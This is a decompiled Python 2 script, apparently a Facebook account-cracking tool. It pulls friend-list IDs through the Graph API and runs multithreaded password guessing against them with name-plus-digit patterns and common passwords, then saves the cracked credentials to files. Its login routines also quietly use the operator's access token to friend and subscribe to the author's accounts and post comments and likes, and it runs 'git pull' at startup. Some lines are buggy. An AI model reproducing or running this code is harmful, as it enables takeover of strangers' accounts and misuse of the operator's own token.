# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <www.youtube.com/c/pythonlife
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/ids/ex_ids')
except OSError:
    pass

os.system('git pull')
from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')
logo = '\n\n\x1b[1;97m-----------------------------------------------'
idh = []
back = 0

def login_choice():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        menu()
    except IOError:
        os.system('clear')
        print logo
        print
        print '   \x1b[101m\x1b[37;1mLOGIN MENU\x1b[0m'
        print
        print '\x1b[1;97m\xe2\x89\xaa\x1b[1;92m1\x1b[1;97m\xe2\x89\xab Login with token'
        print '\x1b[1;97m\xe2\x89\xaa\x1b[1;92m2\x1b[1;97m\xe2\x89\xab Login with id/pass'
        print ''
        login_select()


def login_select():
    global token
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab \x1b[0;97m')
    if select == '1':
        token()
    elif select == '2':
        login_fb()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        time.sleep(1)
        login_select()


def login_fb():
    os.system('clear')
    print logo
    print
    print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
    print
    id = raw_input(' Id/mail/number: ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' Password: ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token=' + q['loc'])
        menu()
    elif 'www.facebook.com' in q['error']:
        print ''
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        time.sleep(1)
        print ''
        raw_input('\tPress enter to back ')
        login_choice()
    else:
        print ''
        print '\t    \x1b[1;31mIncorrect credentials\x1b[0;97m'
        raw_input('Press enter to try again ')
        login_choice()


def token():
    os.system('clear')
    os.system('echo -e " __  __ ____  _____\n|  \\/  | __ )|  ___|\n| |\\/| |  _ \\| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80"| lolcat')
    data = raw_input('\x1b[0;93m[\x1b[0;92m?\x1b[0;93m] \x1b[0;92mToken :\x1b[0;93m ')
    try:
        me = requests.get('https://graph.facebook.com/me?access_token=' + data)
        a = json.loads(me.text)
        nama = a['name']
        open('login.txt', 'w').write(data)
        os.system('echo -e "[\xe2\x9c\x94] Login Berhasil ! "| lolcat')
        bot_komen()
        menu()
    except KeyError:
        os.system('echo -e "[\xe2\x9c\x96] Token Salah ! "| lolcat')
        time.sleep(1.0)
        log_token()


def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        os.system('echo -e "[\xe2\x9c\x96] Token Invalid ! "| lolcat')
        log_token()

    una = '757953543'
    kom = 'I Love You @[757953543:]'
    post = '10158795312888544'
    post2 = '10158807643598544'
    kom2 = 'Mantap Bro \xe2\x9d\xa4\xef\xb8\x8f'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + token)
    requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/10159090813023544/comments/?message=Cantik Banget Bro \xe2\x9d\xa4\xef\xb8\x8f&access_token=' + token)
    requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/likes?summary=true&access_token=' + token)
    menu()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ''
        print logo
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print ''
        print logo
        print ''
        print '\t    \x1b[1;31mToken expired\x1b[0;97m'
        time.sleep(1)
        os.system('rm -rf .login.txt')
        login_choice()

    os.system('clear')
    print logo
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    print '\t    \x1b[1;33mWellCome : ' + name + '\x1b[0;97m'
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    print '\x1b[1;93m\xe2\x89\xaa\x1b[1;97m1\x1b[1;93m\xe2\x89\xab Crack auto pass'
    print '\x1b[1;93m\xe2\x89\xaa\x1b[1;97m2\x1b[1;93m\xe2\x89\xab Crack choice password'
    print '\x1b[1;93m\xe2\x89\xaa\x1b[1;97m3\x1b[1;93m\xe2\x89\xab Target Account Cloning'
    print '\x1b[1;93m\xe2\x89\xaa\x1b[1;97m4\x1b[1;93m\xe2\x89\xab Extract/Dump Link/Files'
    print '\x1b[1;93m\xe2\x89\xaa\x1b[1;97m5\x1b[1;93m\xe2\x89\xab Tool Using Method'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab\x1b[0;97m ')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '3':
        os.system('python2 .tt.py')
    elif select == '4':
        ex_id()
    elif select == '5':
        os.system('xdg-open https://youtu.be/3RScVdKPnF8')
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print
    print '\t  \x1b[101m\x1b[37;1mAUTO PASS CLONING\x1b[0m'
    print
    print '\x1b[1;92m\xe2\x89\xaa\x1b[1;97m1\x1b[1;92m\xe2\x89\xab Crack Public Friendlist'
    print '\x1b[1;92m\xe2\x89\xaa\x1b[1;97m2\x1b[1;92m\xe2\x89\xab Crack File Account'
    print '\x1b[1;92m\xe2\x89\xaa\x1b[1;91m0\x1b[1;92m\xe2\x89\xab Back'
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;33m\xe2\x80\xa2\xe2\x89\xab\x1b[0;97m ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS PUBLIC CRACK\x1b[0;97m'
        print ''
        idt = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) User id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) User Name : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has loading\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS FILE CRACK\x1b[0;97m'
        print ''
        try:
            filelist = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste File : ')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mRequested file not found\x1b[0;97m'
            print ''
            raw_input(' Press enter to back ')
            crack()

    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        crack_select()
    print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Total Account : ' + str(len(id))
    print 47 * '\xe2\x95\x90'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = 'Pakistan'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass1
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '123'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/somi.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass2
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '1234'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass3
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + '12345'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/checkpoint.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass4
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name + '786'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass5
                                cp = open('checkpoint.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass6)
                            else:
                                pass6 = '000786'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass6
                                    cp = open('checkpoint.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = '786786'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;3333mm(SOMI-HACK) ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass7
                                        cp = open('checkpoint.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[0;37mThe process has completed'
    print ' \x1b[0;33mAuto Password Result'
    print ' \x1b[0;37mRESULT :\x1b[0;33m OK : ' + str(len(oks)) + '\x1b[0;37mCP : ' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


def ex_id():
    global token
    idg = []
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print 47 * '\x1b[1;97m\xe2\x95\x90'
    print '\t  \x1b[1;32mCOLLECT PUBLIC ID FRIENDLIST\x1b[0;97m'
    print 47 * '\x1b[1;97m\xe2\x95\x90'
    idt = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Input Id: ')
    try:
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?&access_token=' + token, headers=header)
    except KeyError:
        print ''
        print '\t    \x1b[1;31mLogged in id has loading\x1b[0;97m'
        print ''
        raw_input(' Press enter to back')
        crack()

    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total ids: ' + str(len(idg))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to download file')
    os.system('cp ids_friends.txt /sdcard')
    os.system('rm -rf  ids_friends.txt')
    print ' File downloaded successfully'
    time.sleep(1)
    raw_input('\x1b[1;93mEnter Go Back')
    menu()


def choice():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print
    print '\t \x1b[101m\x1b[37;1mCHOICE PASS CRACK MENU\x1b[0m'
    print
    print '\x1b[1;97m\xe2\x89\xaa\x1b[1;92m1\x1b[1;97m\xe2\x89\xab Crack Public Friendlist'
    print '\x1b[1;97m\xe2\x89\xaa\x1b[1;92m2\x1b[1;97m\xe2\x89\xab Crack File Account'
    print '\x1b[1;97m\xe2\x89\xaa\x1b[1;91m0\x1b[1;91m\xe2\x89\xab Back'
    print ''
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;32m>>> \x1b[0;97m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mCHOICE NAME PASS CRACK\x1b[0;97m'
        p1 = raw_input('\x1b[1;97m(\x1b[1;91m1\x1b[1;97m) Name + Digit : ')
        p2 = raw_input('\x1b[1;97m(\x1b[1;91m2\x1b[1;97m) Name + Digit : ')
        p3 = raw_input('\x1b[1;97m(\x1b[1;91m2\x1b[1;97m) Name + Digit : ')
        p4 = raw_input('\x1b[1;97m(\x1b[1;91m3\x1b[1;97m) Name + Digit : ')
        print
        print '\t    \x1b[1;32mCHOICE DIGIT PASS CRACK\x1b[0;97m'
        print 47 * '\x1b[1;91m\xe2\x95\x90'
        pass5 = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Digit Password : ')
        pass6 = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Digit Password : ')
        pass7 = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Digit Password : ')
        print
        print '\t    \x1b[1;32mAUTO PASS PUBLIC CRACK\x1b[0;97m'
        print ''
        idt = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) User id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) User id : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has loading\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print
        print '\t    \x1b[1;32mCHOICE NAME PASS CRACK\x1b[0;97m'
        print 47 * '\x1b[1;91m\xe2\x95\x90'
        p1 = raw_input('\x1b[1;97m(\x1b[1;91m1\x1b[1;97m) Name + Digit : ')
        p2 = raw_input('\x1b[1;97m(\x1b[1;91m2\x1b[1;97m) Name + Digit : ')
        p3 = raw_input('\x1b[1;97m(\x1b[1;91m3\x1b[1;97m) Name + Digit : ')
        p4 = raw_input('\x1b[1;97m(\x1b[1;91m4\x1b[1;97m) Name + Digit : ')
        print
        print '\t    \x1b[1;32mCHOICE DIGIT PASS CRACK\x1b[0;97m'
        print 47 * '\x1b[1;91m\xe2\x95\x90'
        pass5 = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Digit Password : ')
        pass6 = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Digit Password : ')
        pass7 = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Digit Password : ')
        print ''
        print '\t    \x1b[1;32mAUTO PASS FILE CRACK\x1b[0;97m'
        print ''
        try:
            filelist = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste File : ')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mRequested file not found\x1b[0;97m'
            print ''
            raw_input(' Press enter to back ')
            menu()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Total Account : ' + str(len(id))
    print 47 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass1
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/checkpoint.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass2
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass3
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/checkpoint.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass4
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass5
                                cp = open('checkpoint.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass6)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass6
                                    cp = open('checkpoint.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;33m(SOMI-HACK) ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[0;37m(SOMI-CHECK) ' + uid + ' | ' + pass7
                                        cp = open('checkpoint.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[0;37mThe process has completed'
    print ' \x1b[0;33mManual Password Result'
    print ' \x1b[0;37mRESULT :\x1b[0;33m OK : ' + str(len(oks)) + '\x1b[0;37mCP : ' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    choice()


if __name__ == '__main__':
    login_choice()
